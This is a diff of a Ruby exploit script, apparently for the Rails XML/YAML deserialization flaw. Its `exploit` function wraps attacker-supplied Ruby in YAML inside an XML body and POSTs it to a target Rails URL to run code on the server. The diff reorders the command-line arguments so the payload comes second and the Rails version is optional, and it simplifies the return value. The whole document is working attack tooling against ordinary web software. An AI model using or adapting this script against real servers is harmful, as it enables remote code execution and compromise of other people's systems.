@@ -8,7 +8,6 @@
 #
 # ## Caveats
 #
-# * Does not support Rails 2.
 # * Does not support Ruby 1.8.7.
 #
 # ## Synopsis
@@ -112,7 +111,7 @@ def exploit(url,payload,target=:rails3)
 <exploit type="yaml">#{yaml.html_escape}</exploit>
   }.strip
 
-  response = http_post(
+  return http_post(
     :url       => url,
     :headers   => {
       :content_type           => 'text/xml',
@@ -120,19 +119,17 @@ def exploit(url,payload,target=:rails3)
     },
     :body      => xml
   )
-
-  return response
 end
 
 if $0 == __FILE__
-  unless ARGV.length == 3
-    $stderr.puts "usage: #{$0} URL [rails2|rails3] RUBY"
+  unless ARGV.length >= 2
+    $stderr.puts "usage: #{$0} URL RUBY [rails3|rails2]"
     exit -1
   end
 
   url     = ARGV[0]
-  target  = ARGV[1].to_sym
-  payload = ARGV[2]
+  payload = ARGV[1]
+  target  = ARGV.fetch(2,:rails3).to_sym
 
   print_info "POSTing #{payload} to #{url} ..."
   response = exploit(url,payload,target)
